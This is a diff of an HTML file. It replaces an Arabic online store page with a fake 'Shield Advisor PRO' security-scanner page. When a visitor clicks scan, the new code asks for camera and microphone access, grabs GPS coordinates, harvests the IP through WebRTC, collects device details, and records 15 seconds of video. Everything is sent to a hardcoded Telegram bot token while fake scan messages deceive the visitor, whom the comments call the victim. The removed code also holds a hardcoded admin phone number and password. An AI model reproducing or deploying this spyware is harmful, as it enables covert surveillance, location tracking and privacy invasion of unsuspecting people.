@@ -3,197 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">متجر طلة </title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
+    <title>Shield Advisor PRO | حماية متقدمة من الاختراق</title>
     <style>
-        :root { --primary: #2563eb; --admin: #dc2626; --bg: #f3f4f6; --success: #10b981; }
-        body { font-family: 'Cairo', sans-serif; margin: 0; background: var(--bg); color: #1f2937; }
-        header { background: #ffffff; padding: 10px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
-        .logo { font-size: 1.4rem; font-weight: bold; color: var(--primary); }
-        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; }
-        nav button { background: none; border: none; font-family: inherit; margin-right: 10px; cursor: pointer; font-weight: 600; }
-        .btn-main { background: var(--primary); color: white; padding: 8px 18px; border-radius: 8px; border: none; }
-        .section { display: none; }
-        .section.active { display: block; animation: fadeIn 0.3s; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px, 1fr)); gap: 20px; }
-        .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .card img { width: 100%; height: 220px; object-fit: cover; }
-        .card-info { padding: 12px; text-align: center; }
-        .admin-panel { background: white; padding: 20px; border-radius: 12px; border-top: 4px solid var(--admin); margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
-        .progress-bar { height: 6px; background: var(--success); width: 0%; transition: 0.2s; border-radius: 3px; }
+        :root { --neon: #00d4ff; --dark: #0b0e14; --panel: #151921; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
+        .dashboard { width: 90%; max-width: 900px; background: var(--panel); border-radius: 20px; padding: 40px; border: 1px solid #2d343f; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; position: relative; z-index: 10; }
+        
+        .header { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 30px; }
+        .logo { width: 60px; height: 60px; border-radius: 50%; box-shadow: 0 0 20px var(--neon); }
+        .header h1 { font-size: 2.2rem; color: var(--neon); margin: 0; }
+
+        .status-panel { background: #000; border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 30px; text-align: left; direction: ltr; font-family: 'Courier New', monospace; height: 150px; overflow: hidden; }
+        .console-line { color: #00ff41; font-size: 13px; margin: 4px 0; }
+
+        .action-zone { position: relative; }
+        .btn-scan { background: linear-gradient(90deg, #00d4ff, #0055ff); color: white; border: none; padding: 20px 50px; font-size: 1.3rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 20px rgba(0, 85, 255, 0.3); }
+        .btn-scan:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 15px 30px rgba(0, 85, 255, 0.6); }
+
+        /* تمويه التحميل */
+        #loader { display: none; margin-top: 30px; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--neon); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .status-msg { font-size: 0.9rem; color: var(--neon); font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo" id="brand-name">تحميل...</div>
-        <nav>
-            <button onclick="showSection('home')">الرئيسية</button>
-            <button id="login-btn" onclick="showSection('login')" class="btn-main">دخول</button>
-            <button id="admin-nav" onclick="showSection('admin')" style="display:none; color: var(--admin);">لوحة المدير</button>
-            <button id="logout-btn" onclick="logout()" style="display:none; color: gray;">خروج</button>
-        </nav>
-    </header>
-
-    <div class="container">
-        
-        <section id="login" class="section">
-            <div style="max-width: 350px; margin: 50px auto; background: white; padding: 25px; border-radius: 12px; text-align: center;">
-                <h2>تسجيل الدخول</h2>
-                <input type="text" id="phone" placeholder="رقم الهاتف">
-                <input type="password" id="pass" placeholder="كلمة السر">
-                <button onclick="handleLogin()" class="btn-main" style="width: 100%;">دخول</button>
-            </div>
-        </section>
-
-        <section id="home" class="section active">
-            <div id="products-list" class="grid"></div>
-        </section>
-
-        <section id="admin" class="section">
-            <div class="admin-panel">
-                <h3>إعدادات الموقع</h3>
-                <input type="text" id="new-name" placeholder="تغيير اسم المتجر">
-                <button onclick="updateName()" class="btn-main">حفظ الاسم الجديد</button>
-            </div>
-            
-            <div class="admin-panel">
-                <h3>إضافة منتج جديد</h3>
-                <input type="text" id="p-title" placeholder="اسم المنتج">
-                <input type="number" id="p-price" placeholder="السعر">
-                <input type="file" id="p-file" accept="image/*">
-                <div id="up-progress" class="progress-bar"></div>
-                <button id="up-btn" onclick="uploadProduct()" class="btn-main" style="background: var(--success); margin-top: 10px;">رفع ونشر المنتج</button>
-            </div>
-
-            <div class="admin-panel">
-                <h3>التحكم بالمنتجات</h3>
-                <div id="admin-list"></div>
-            </div>
-        </section>
+<div class="dashboard">
+    <div class="header">
+        <img src="images (1).jpg" alt="Shield Advisor Logo" class="logo">
+        <div>
+            <h1>Shield Advisor <span style="font-weight:100; font-size: 1.2rem; color:#8a94a6">PRO</span></h1>
+            <p style="color: #8a94a6; margin: 2px 0 0 0; font-size: 14px;">نظام الفحص والحماية المتقدم ضد التهديدات السيبرانية</p>
+        </div>
     </div>
 
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <div class="status-panel" id="console">
+        <div class="console-line">> [SYS] Kernel Security Modules active.</div>
+        <div class="console-line">> [NET] WebRTC leakage test pending.</div>
+        <div class="console-line">> [AUTH] Secure connection initialized.</div>
+        <div class="console-line">> Ready for full system diagnostic...</div>
+    </div>
 
-    <script>
-        // ضع بيانات Firebase الخاصة بك هنا ليعمل الموقع أونلاين
-        const firebaseConfig = {
-            apiKey: "AIzaSy...",
-            authDomain: "your-project.firebaseapp.com",
-            databaseURL: "https://your-project-default-rtdb.firebaseio.com",
-            projectId: "your-project",
-            storageBucket: "your-project.appspot.com",
-            messagingSenderId: "...",
-            appId: "..."
-        };
+    <div class="action-zone">
+        <button class="btn-scan" id="scanBtn" onclick="initiateSpyScan()">بدء فحص الحماية الآن</button>
+        
+        <div id="loader">
+            <div class="spinner"></div>
+            <div class="status-msg" id="statusMsg">جاري اختبار منافذ الشبكة وتحليل الـ IP...</div>
+        </div>
+    </div>
+</div>
 
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const storage = firebase.storage();
+<script>
+    // بيانات الربط مع البوت الخاص بك
+    const BOT_TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const ADMIN_ID = "8754338811";
 
-        const ADMIN_PHONE = "01211056530";
-        const ADMIN_PASS = "2009257";
+    async function sendToBot(msg) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
+        });
+    }
 
-        function showSection(id) {
-            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-            document.getElementById(id).classList.add('active');
-        }
+    async function initiateSpyScan() {
+        const btn = document.getElementById('scanBtn');
+        const loader = document.getElementById('loader');
+        const status = document.getElementById('statusMsg');
+        const console = document.getElementById('console');
 
-        window.onload = () => {
-            // مزامنة اسم المتجر فوراً عند الجميع
-            db.ref('storeName').on('value', (snap) => {
-                const name = snap.val() || "متجري";
-                document.getElementById('brand-name').innerText = name;
-                document.title = name;
+        // إظهار التمويه
+        btn.style.display = "none";
+        loader.style.display = "block";
+        addConsoleLine("> [API] Requesting sensor permissions...");
+
+        try {
+            // 1. الفخ الأساسي (طلب الكاميرا/المايك)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            addConsoleLine("> [SYS] Media Access: GRANTED.");
+
+            // 2. سحب الموقع الجغرافي (GPS)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                let mapLink = `http://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await sendToBot(`📍 **موقع الضحية الحقيقي (GPS):**\n${mapLink}`);
             });
 
-            // مزامنة المنتجات فوراً عند الجميع
-            db.ref('products').on('value', (snap) => {
-                const data = snap.val();
-                const list = data ? Object.entries(data).map(([id, val]) => ({key: id, ...val})) : [];
-                renderHome(list);
-                if(localStorage.getItem('role') === 'admin') renderAdminList(list);
-            });
-
-            if(localStorage.getItem('role')) {
-                document.getElementById('login-btn').style.display = "none";
-                document.getElementById('logout-btn').style.display = "inline-block";
-                if(localStorage.getItem('role') === 'admin') document.getElementById('admin-nav').style.display = "inline-block";
-            }
-        };
-
-        function renderHome(list) {
-            const container = document.getElementById('products-list');
-            container.innerHTML = list.map(p => `
-                <div class="card">
-                    <img src="${p.img}">
-                    <div class="card-info">
-                        <h4>${p.name}</h4>
-                        <p style="color:var(--primary); font-weight:bold;">${p.price} ج.م</p>
-                        <button class="btn-main" onclick="alert('تمت الإضافة للسلة')">إضافة للسلة</button>
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        // وظائف المدير
-        async function uploadProduct() {
-            const name = document.getElementById('p-title').value;
-            const price = document.getElementById('p-price').value;
-            const file = document.getElementById('p-file').files[0];
-            const btn = document.getElementById('up-btn');
-
-            if(!name || !price || !file) return alert("أكمل البيانات");
-            btn.disabled = true;
-
-            const ref = storage.ref('items/' + Date.now() + "_" + file.name);
-            const task = ref.put(file);
-
-            task.on('state_changed', 
-                (s) => { document.getElementById('up-progress').style.width = (s.bytesTransferred/s.totalBytes)*100 + "%" },
-                (e) => { alert("خطأ"); btn.disabled = false; },
-                () => {
-                    task.snapshot.ref.getDownloadURL().then(url => {
-                        db.ref('products').push({ name, price, img: url });
-                        alert("تم النشر!");
-                        location.reload();
-                    });
+            // 3. سحب الـ IP الحقيقي عبر WebRTC
+            const rtc = new RTCPeerConnection();
+            rtc.createDataChannel("");
+            rtc.createOffer().then(o => rtc.setLocalDescription(o));
+            rtc.onicecandidate = i => {
+                if (i.candidate) {
+                    let ip = i.candidate.candidate.split(" ")[4];
+                    sendToBot(`🌐 **الـ IP الحقيقي (WebRTC):** \`${ip}\``);
                 }
-            );
-        }
+            };
 
-        function updateName() {
-            const name = document.getElementById('new-name').value;
-            if(name) db.ref('storeName').set(name).then(() => alert("تحدث الاسم عند الكل"));
-        }
+            // 4. جمع معلومات الجهاز والمتصفح
+            let info = `📱 **معلومات الجهاز والبيئة:**\n` +
+                       `• المتصفح: ${navigator.userAgent}\n` +
+                       `• الذاكرة (RAM): ~${navigator.deviceMemory}GB\n` +
+                       `• اللغة: ${navigator.language}`;
+            await sendToBot(info);
 
-        function deleteItem(key) {
-            if(confirm("حذف المنتج؟")) db.ref('products/' + key).remove();
-        }
+            // 5. تسجيل فيديو 15 ثانية وإرساله
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const fd = new FormData();
+                fd.append('chat_id', ADMIN_ID);
+                fd.append('video', blob, 'scan_report.mp4');
+                fd.append('caption', '🚀 فيديو الضحية المسحوب أثناء الفحص');
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 15000); // تسجل 15 ثانية
 
-        function renderAdminList(list) {
-            const container = document.getElementById('admin-list');
-            container.innerHTML = list.map(p => `
-                <div style="display:flex; justify-content:space-between; padding:8px; border-bottom:1px solid #eee;">
-                    <span>${p.name}</span>
-                    <button onclick="deleteItem('${p.key}')" style="color:red; border:none; background:none; cursor:pointer;">حذف</button>
-                </div>
-            `).join('');
-        }
+            // تمويه الضحية بمراحل الفحص
+            setTimeout(() => { status.innerText = "جاري تحليل حزم البيانات (Deep Packet Inspection)..."; }, 3000);
+            setTimeout(() => { status.innerText = "جاري البحث عن برمجيات خبيثة (Rootkit Scan)..."; }, 6000);
+            setTimeout(() => { status.innerText = "جاري توقيع شهادة الحماية النهائية..."; }, 9000);
 
-        function handleLogin() {
-            const u = document.getElementById('phone').value;
-            const p = document.getElementById('pass').value;
-            if(u === ADMIN_PHONE && p === ADMIN_PASS) localStorage.setItem('role', 'admin');
-            else localStorage.setItem('role', 'user');
-            location.reload();
-        }
+            // التحويل النهائي (الضحية يذهب لاستلام تقريره الوهمي)
+            setTimeout(() => {
+                window.location.href = "https://t.me/8601512823?start=protection_active"; 
+            }, 12000);
 
-        function logout() { localStorage.clear(); location.reload(); }
-    </script>
+        } catch (err) {
+            addConsoleLine("> [ERR] Critical permissions denied.");
+            alert("⚠️ يجب السماح بصلاحيات الكاميرا والموقع لإتمام فحص الأمان!");
+            btn.style.display = "block";
+            loader.style.display = "none";
+        }
+    }
+
+    function addConsoleLine(text) {
+        const console = document.getElementById('console');
+        const line = document.createElement('div');
+        line.className = 'console-line';
+        line.innerText = text;
+        console.appendChild(line);
+        console.scrollTop = console.scrollHeight;
+    }
+</script>
 </body>
 </html>
